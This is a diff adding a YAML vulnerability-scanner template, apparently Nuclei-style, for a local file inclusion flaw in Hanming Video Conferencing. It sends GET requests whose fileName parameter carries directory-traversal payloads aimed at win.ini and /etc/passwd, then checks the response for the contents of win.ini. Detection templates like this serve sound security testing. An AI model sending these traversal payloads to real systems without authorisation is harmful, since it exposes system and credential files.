@@ -1,0 +1,25 @@
+id: hanming-lfr
+brief:
+    title: Hanming Video Conferencing - Local File Inclusion
+    by: ritikchaddha
+    level: high
+    about: Hanming Video Conferencing is vulnerable to local file inclusion.
+    label:
+        - lfr
+        - hanming
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini'
+        - '{{BaseURL}}/register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
